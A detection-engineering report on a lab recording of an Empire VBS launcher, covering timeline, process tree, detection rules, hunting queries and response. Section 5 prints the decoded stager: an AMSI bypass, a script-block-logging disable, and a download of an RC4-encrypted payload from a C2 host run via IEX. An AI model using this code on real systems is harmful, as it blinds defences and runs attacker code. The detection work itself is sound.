---
title: Empire VBS launcher — a desktop script that blinds PowerShell, then beacons
date: 2026-09-16
technique: Empire launcher (VBS stager)
dataset: Security-Datasets atomic/windows/execution/host/empire_launcher_vbs.zip
summary: A user opened launcher.vbs, which started encoded PowerShell that disabled AMSI and script block logging, pulled its agent from an HTTP C2 and beaconed every 5 seconds.
attack: T1204.002, T1059.005, T1059.001, T1027, T1140, T1562.001, T1105, T1071.001, T1016, T1033, T1082
rules: script-host-spawns-powershell, encoded-powershell-command, powershell-amsi-and-logging-tamper
status: final
---

# Empire VBS launcher — a desktop script that blinds PowerShell, then beacons

## 1. Executive summary

- **What:** `THESHIRE\pgustavo` opened `launcher.vbs` on the desktop of `WORKSTATION5`. It started PowerShell with an
  encoded command that turned off AMSI and script block logging, downloaded its agent from `hxxp://10.10.10[.]5/news.php`,
  fingerprinted the host over WMI and settled into a 5-second beacon. `whoami` ran 25 seconds later.
- **Detection:** the durable signals are relationships and shapes, not strings from this campaign — a script host
  starting PowerShell, an encoded command line, and a script block that names AMSI or the logging policy. Three rules
  written here cover those. Nothing is written to disk, so file-based detection has nothing to work with.
- **Action:** isolate the host, treat the session as compromised. The most useful finding for the SOC is in §6: the
  stager's attempt to silence logging is itself logged, and it is the last script block the host recorded.

## 2. Dataset

| Field | Value |
|---|---|
| Source | [Security-Datasets `atomic/windows/execution/host/empire_launcher_vbs.zip`](https://github.com/OTRF/Security-Datasets/tree/master/datasets/atomic/windows/execution/host) |
| Archive | `empire_launcher_vbs.zip` — SHA256 `812da270cf8cda6f1948fb6275410f15dc1794d0bd6b623c9c25b2518285019c` |
| Events | 2,067 (Sysmon 1,190 · Security 652 · Windows PowerShell 133 · PowerShell/Operational 91 · WMI-Activity 1) |
| Time range (UTC) | 2020-09-04 20:09:40.845 → 20:10:49.124 (68 s) |
| Hosts | `WORKSTATION5.theshire.local` (the victim, user `THESHIRE\pgustavo`, medium integrity, logon id `0x2d5a4b`); `MORDORDC` and `WORKSTATION6` are background noise from the same lab |
| ATT&CK (claimed by the dataset) | T1059.005 |
| Loaded as | `ep.win_events` partition `empire_launcher_vbs` — see [dataset.txt](dataset.txt) |

**Timestamps in this report are the collector's** (`@timestamp`, the time the Windows Event Collector received the
event). Sysmon's own `UtcTime` runs 1–3 seconds earlier and varies per event, so ordering *within* a channel is
reliable and sub-second ordering *between* channels is not evidence. Where it changes a conclusion, both are given.

## 3. What happened

| Time (UTC) | Event | Detail | Evidence |
|---|---|---|---|
| 20:09:55.953 | Process create | `explorer.exe` (5728) → `wscript.exe` (2440) `"C:\windows\System32\WScript.exe" "C:\Users\pgustavo\Desktop\launcher.vbs"` | Sysmon 1, record 251079 |
| 20:09:55.980 | File created | `…\Windows\Recent\launcher.lnk`, written by `explorer.exe` — the user opened the file by hand | Sysmon 11, record 251133 |
| 20:09:57.060 | Process create | `wscript.exe` → `powershell.exe` (2316) `-noP -sta -w 1 -enc <5,056 base64 characters>` | Sysmon 1, record 251258 |
| 20:09:57.074 | Process create | `conhost.exe` (7700) — PowerShell's console host, not a separate action | Sysmon 1, record 251273 |
| 20:10:00.327 | Script block | the decoded stager, 1,899 characters, logged at **severity WARNING** | PowerShell 4104, record 1948 |
| 20:10:01.628 | Connection allowed | `powershell.exe` → 10.10.10[.]5:80 permitted by the filtering platform | Security 5156 |
| 20:10:02.673 | Network connection | `powershell.exe` 172.18.39.5:50699 → 10.10.10[.]5:80 (Sysmon `UtcTime` 20:09:59.621) | Sysmon 3, record 251809 |
| 20:10:02.693 | Host fingerprint | `Get-WmiObject Win32_NetworkAdapterConfiguration`, then `Win32_OperatingSystem` | PowerShell 4103 |
| 20:10:07.784 … 20:10:49.119 | Beacon | `Start-Sleep -Seconds 5` nine times, 5.01–6.09 s apart | PowerShell 4103 |
| 20:10:24.933 | Process create | `powershell.exe` → `whoami.exe` (9152) | Sysmon 1, record 251944 (also Security 4688, record 67369) |

The recording ends at 20:10:49 with the agent still beaconing: 29 seconds from double-click to the first command the
operator typed.

## 4. Process tree

```
explorer.exe (5728)                         [not in this recording — only referenced as the parent]
└── wscript.exe (2440)     "C:\windows\System32\WScript.exe" "C:\Users\pgustavo\Desktop\launcher.vbs"
    └── powershell.exe (2316)  "…\v1.0\powershell.exe" -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAFIAUwBpAE8Abg…
        ├── conhost.exe (7700)   \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
        └── whoami.exe (9152)    "C:\windows\system32\whoami.exe"
```

`explorer.exe` as the grandparent is the whole delivery story: a person opened a file. No mail client, browser or
archive tool appears, so how the `.vbs` reached the desktop is outside this recording.

Both binaries are the genuine signed system files — `wscript.exe` SHA256 `f42201b5d890a96302f90102b16d7c31cfcc3b67c801ba7c6f6be223f16d7011`,
`powershell.exe` SHA256 `908b64b1971a979c7e3e8ce4621945cba84854cb98d76367b791a6e22b5f6d53` — so hash-based detection
has nothing to catch. The malicious part is the argument, and later only memory.

## 5. Evidence per stage

| Stage | What the logs show | Where |
|---|---|---|
| User execution | `launcher.lnk` in Recent, `explorer.exe` as parent, medium integrity | Sysmon 11, Sysmon 1 |
| Execution | `wscript.exe` runs a `.vbs` from the desktop, then PowerShell with `-noP -sta -w 1 -enc` | Sysmon 1 / Security 4688 |
| Defence evasion | the script block sets `EnableScriptB`+`lockLogging` to 0 in `cachedGroupPolicySettings` and `amsiInitF`+`ailed` to `$true` | PowerShell 4104 |
| Ingress / C2 | `System.Net.WebClient` → `hxxp://10.10.10[.]5/news.php`, browser User-Agent, fixed `Cookie`, response RC4-decrypted and passed to `IEX` | PowerShell 4104, Sysmon 3, Security 5156 |
| Discovery | WMI `Win32_NetworkAdapterConfiguration` and `Win32_OperatingSystem`, then `whoami.exe` | PowerShell 4103, Sysmon 1 |
| Beaconing | `Start-Sleep -Seconds 5` ×9 with `Get-Random` around it | PowerShell 4103 |
| Persistence | **none** — no Run key, service or scheduled task. The 28 registry writes that match a persistence pattern are OS noise: `Tcpip\Parameters` reads, `W32Time`, Defender's `WdNisDrv` | Sysmon 12/13/14, Security 4697/4698 |
| Credential access | **none** — the only LSASS handle is `svchost.exe` with `0x1000` (query only) | Sysmon 10 |

**What the encoded command decodes to.** The `-enc` argument is 5,056 base64 characters; decoded as UTF-16LE it is
1,895 characters of PowerShell. Decoded here for reading only — nothing was executed:

```powershell
If($PSVERSiOnTaBlE.PSVErSIOn.MajOR -gE 3){
  $6866=[rEF].ASsEMbLY.GetTYPE('System.Management.Automation.Utils')."GEtFie`LD"('cachedGroupPolicySettings','N'+'onPublic,Static')
  … $1FE7['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0 …
  $Ref=[ReF].AsseMBlY.GETTypE('System.Management.Automation.Amsi'+'Utils')
  $REf.GeTFIELd('amsiInitF'+'ailed','NonPublic,Static').SeTVaLUE($nulL,$tRUE); }
$F94E=New-ObJECt SYsTEM.NeT.WebCLienT
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'
$ser=…FRoMBAsE64StriNg('aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==')   # http://10.10.10.5
$t='/news.php'; $f94E.HEaderS.ADd('User-Agent',$u); $f94e.PROxY=[…]::DeFAULtWEBPROXy
$F94E.PrOXY.CReDentIaLS = […]::DefAultNEtwORkCreDENtialS
$K=[…]::ASCII.GetByteS('3+Ymcn)s0r8=#dxZ65;}O%|LlHi~f{zB')   # RC4 key
$R={…$_-bXor$S[($S[$I]+$S[$H])%256]}                          # RC4 in a script block
$F94E.HeADeRS.Add("Cookie","JQOHuDGrNLGeOPyl=E2Hzj61lui7hWMYQe63WUws0zZ8=")
$datA=$f94E.DOWnLoADData($seR+$t); $Iv=$data[0..3]; -joIN[CHAr[]](& $R $daTA ($IV+$K))|IEX
```

Three details are worth an analyst's attention. The C2 address is base64 inside the already-base64 command, so a
search for `10.10.10.5` in command lines finds nothing. The client is set to use the system proxy with the logged-in
user's default credentials — the stager expects to have to get through a corporate proxy and to authenticate as the
victim while doing it. And the payload is RC4-decrypted in memory and handed to `IEX`, so from the download onward
there is no file to scan and no new process to see.

## 6. Detection opportunities

| Signal | Durability | Note |
|---|---|---|
| `wscript.exe`/`cscript.exe` → `powershell.exe` | high | the delivery script can be rewritten entirely; the handover survives |
| a script block naming AMSI or the logging policy | high | the technique must reference those .NET fields; concatenation and case do not hide them from 4104 |
| PowerShell making its own outbound connection | high | needs Sysmon 3 or WFP 5156, but a script interpreter as a network client is rare on a workstation |
| `Start-Sleep` at a fixed interval in module logging | medium | a beacon that sleeps in .NET instead of a cmdlet leaves no 4103 trail |
| `-enc` on the command line | medium | trivially shortened to `-e`, or replaced by reading the script from a file, a registry value or stdin |
| the IE11 User-Agent and the fixed `Cookie` | medium | Empire defaults; a competent operator changes both in the listener profile |
| `10.10.10[.]5`, `/news.php`, the RC4 key | low | lab values — context for this case, never a rule |

**The finding that matters most.** The stager's own script block was recorded, at severity `WARNING`, and it is the
**only** 4104 event in the whole recording — the agent then ran for 47 more seconds, executing script through `IEX`
continuously, without producing a second one. Windows logs script blocks it considers suspicious even when script
block logging is off, which is why the tamper attempt was captured; after it, the detailed script text is gone.

Two practical consequences:

1. A single 4104 at `WARNING` severity, with no ordinary 4104 traffic around it, is a stronger signal than its content.
2. **Module logging (4103) kept working.** It is what still shows the WMI fingerprinting and the 5-second beacon after
   script block logging went quiet. A SOC that enables only script block logging loses the whole post-exploitation
   phase of this intrusion; one that enables both keeps a 47-second trail of the agent.

I cannot prove from this recording alone that the tamper *caused* the silence — script block logging may simply never
have been enabled by policy, and the one event may be the automatic suspicious-block path. Both explanations produce
the same telemetry, and both lead to the same recommendation.

## 7. My rules

| Rule | Level | Fires on | Stays silent on |
|---|---|---|---|
| [`script-host-spawns-powershell`](../../rules/sigma/script-host-spawns-powershell.yml) | high | `empire_launcher_vbs` — 2 hits (Sysmon 1 and Security 4688 for the same process) | `cmd_lsass_memory_dumpert_syscalls` |
| [`encoded-powershell-command`](../../rules/sigma/encoded-powershell-command.yml) | high | `empire_launcher_vbs` — 2 hits | `cmd_lsass_memory_dumpert_syscalls` |
| [`powershell-amsi-and-logging-tamper`](../../rules/sigma/powershell-amsi-and-logging-tamper.yml) | high | `empire_launcher_vbs` — 1 hit | `cmd_lsass_memory_dumpert_syscalls` |

The third rule was written for this case. It keys on the two field names the technique cannot avoid naming, and on the
policy dictionary it has to reach into — not on Empire's obfuscation, which differs per build:

```yaml
logsource:
  product: windows
  category: ps_script          # -> event_id 4104
detection:
  amsi:
    ScriptBlockText|contains: ['amsiInitF', 'AmsiUtils', 'amsiContext']
  logging:
    ScriptBlockText|contains: ['cachedGroupPolicySettings', 'EnableScriptB', 'ScriptBlockLogging']
  condition: amsi or logging
```

`amsiInitF` and `EnableScriptB` are deliberately truncated at the point where this sample splits the string
(`'amsiInitF'+'ailed'`), so the rule matches both the split and the unsplit spelling. Full intent, evasion notes and
false-positive guidance are in [rules/README.md](../../rules/README.md).

**validate-rules.sh result** (full report in [rules/validation.txt](../../rules/validation.txt))

```
Result:    PASSED — 4 PASS, 0 FAIL, 0 false-positive candidates, 0 warnings

  rule                                dataset                            result  hits  expected
  encoded-powershell-command          empire_launcher_vbs                PASS    2     >= 1
  lsass-memory-read-access            cmd_lsass_memory_dumpert_syscalls  PASS    2     >= 1
  powershell-amsi-and-logging-tamper  empire_launcher_vbs                PASS    1     >= 1
  script-host-spawns-powershell       empire_launcher_vbs                PASS    2     >= 1

  Coverage matrix                     cmd_lsass_memory_dumpert_syscalls  empire_launcher_vbs
  encoded-powershell-command          .                                  P
  lsass-memory-read-access            P                                  .
  powershell-amsi-and-logging-tamper  .                                  P
  script-host-spawns-powershell       .                                  P
```

Every other loaded recording is the control group: a rule that fires there without being expected to is reported as a
false-positive candidate. With two recordings that is a weak control, and I say so in §10.

## 8. ATT&CK mapping

| Tactic | Technique | Evidence | Detected by |
|---|---|---|---|
| Initial Access / Execution | T1204.002 User Execution: Malicious File | `explorer.exe` parent, `launcher.lnk` in Recent | not detected — indistinguishable from opening any file |
| Execution | T1059.005 Command and Scripting Interpreter: Visual Basic | `wscript.exe` running `launcher.vbs` | **script-host-spawns-powershell** |
| Execution | T1059.001 PowerShell | the encoded stager and the agent's cmdlets | **encoded-powershell-command**, **powershell-amsi-and-logging-tamper** |
| Defense Evasion | T1027 Obfuscated Files or Information | base64 command, split strings, mangled case, backtick in `GEtFie\`LD` | **encoded-powershell-command** |
| Defense Evasion | T1140 Deobfuscate/Decode Files or Information | nested base64 for the C2 host, RC4 over the downloaded payload | not detected on its own |
| Defense Evasion | T1562.001 Impair Defenses: Disable or Modify Tools | AMSI and script block logging disabled in memory | **powershell-amsi-and-logging-tamper** |
| Command and Control | T1105 Ingress Tool Transfer | `DownloadData` of the agent, executed through `IEX` | not detected (see §10) |
| Command and Control | T1071.001 Application Layer Protocol: Web Protocols | HTTP to `/news.php` with a browser User-Agent and fixed cookie | not detected (see §10) |
| Discovery | T1016 System Network Configuration Discovery | `Get-WmiObject Win32_NetworkAdapterConfiguration` | not detected — too common alone |
| Discovery | T1082 System Information Discovery | `Get-WmiObject Win32_OperatingSystem` | not detected — too common alone |
| Discovery | T1033 System Owner/User Discovery | `whoami.exe` under `powershell.exe` | not detected — too common alone |

The dataset labels itself T1059.005 only; the other ten are what the events actually show.

## 9. Hunting queries

The queries used for this report are in [queries.sql](queries.sql); the rows they produced are in
[findings.csv](findings.csv). These three generalise to a real estate:

```sql
-- 1. Script hosts handing over to PowerShell — the durable shape of this whole family
SELECT ts, hostname, user, parent_image, image, command_line
FROM ep.win_events
WHERE event_id IN (1, 4688)
  AND (parent_image ILIKE '%\\wscript.exe' OR parent_image ILIKE '%\\cscript.exe')
  AND image ILIKE '%\\powershell.exe'
ORDER BY ts;

-- 2. Hosts where script block logging went quiet right after a suspicious block:
--    one 4104 event, and module logging still running afterwards
SELECT hostname,
       countIf(event_id = 4104)                                     AS script_blocks,
       countIf(event_id = 4103)                                     AS module_events,
       maxIf(ts, event_id = 4104)                                   AS last_script_block,
       maxIf(ts, event_id = 4103)                                   AS last_module_event
FROM ep.win_events
WHERE event_id IN (4103, 4104)
GROUP BY hostname
HAVING script_blocks <= 2 AND last_module_event > last_script_block + INTERVAL 30 SECOND;

-- 3. A beacon visible on the endpoint: a fixed sleep repeated by one process
SELECT hostname, process_id,
       count()                                        AS sleeps,
       round(avg(gap), 2)                             AS mean_gap_s,
       round(stddevPop(gap), 2)                       AS jitter_s
FROM (
  SELECT hostname, process_id, ts,
         date_diff('second', lagInFrame(ts) OVER (PARTITION BY hostname, process_id ORDER BY ts), ts) AS gap
  FROM ep.win_events
  WHERE event_id = 4103 AND extra['Payload'] ILIKE '%CommandInvocation(Start-Sleep)%'
)
WHERE gap BETWEEN 1 AND 600
GROUP BY hostname, process_id
HAVING sleeps >= 5 AND jitter_s < 2
ORDER BY sleeps DESC;
```

Query 2 returns exactly one row on the data loaded here: `WORKSTATION5`, 1 script block, 87 module events, the last
module event 49 seconds after the last script block.

Query 3 is the endpoint half of the beaconing detection in the network project (`~/JC`, DET-101): the same behaviour,
measured from the process instead of from the connection. It also returns one row — `WORKSTATION5`, pid 2316, 8 gaps,
mean 5.25 s, jitter 0.43 s — which is the PowerShell process from §4, tying the beacon back to `launcher.vbs`.

That tie needed a fix to the loader, made while writing this report: PowerShell channel events carry their pid in the
envelope field `ExecutionProcessID`, which the mapper had been discarding, so every 4103 and 4104 row had
`process_id = 0` and could not be joined to a process. Events on the classic `Windows PowerShell` channel (400/600/800)
still have no pid — that channel does not record one.

## 10. Limitations and response

- **The dataset does not show** how `launcher.vbs` reached the desktop (no mail or browser events), what the C2
  returned, or anything after 20:10:49. There is no persistence, credential access or lateral movement in it, so this
  case says nothing about how the intrusion would have continued.
- **One host, one lab.** `10.10.10[.]5` is the lab's C2 and `THESHIRE\pgustavo` its test user; neither is an indicator
  worth sharing. The `__PSScriptPolicyTest_*.ps1` files that PowerShell created and deleted are its own script-policy
  probes, not attacker cleanup — my triage lists them under "files deleted by their creator", and they are benign.
- **Two recordings is a weak control group.** Every rule here is validated against exactly one other dataset, which
  proves it is not trivially noisy and nothing more. Real false-positive rates need a benign baseline, which this
  repository does not have yet.
- **Only one outbound connection is recorded** although the agent beaconed for another 47 seconds. Reused keep-alive
  connections would explain it, and so would a gap in collection; the data does not distinguish them. Endpoint
  telemetry told me *that* PowerShell connected, never what it sent — the content side of T1071.001 and T1105 needs
  network telemetry or a proxy log, which is where the sibling project's rules live.
- **Response:** isolate the host; collect the PowerShell operational log before it rolls; reset the user's credentials
  and Kerberos tickets, since the stager was configured to authenticate to a proxy as them; hunt the estate with the
  queries in §9. Then ask the two questions the detections cannot answer — why a `.vbs` on a desktop was allowed to
  execute at all, and whether script block *and* module logging are enabled everywhere. Turning off Windows Script
  Host for standard users removes this entire delivery path; the rules in §7 only tell you it happened.

**Lessons:** module logging outlived script block logging here and carried the whole post-exploitation trail, and the
collector's timestamps are not the event times. Details in [docs/lessons.md](../../docs/lessons.md).
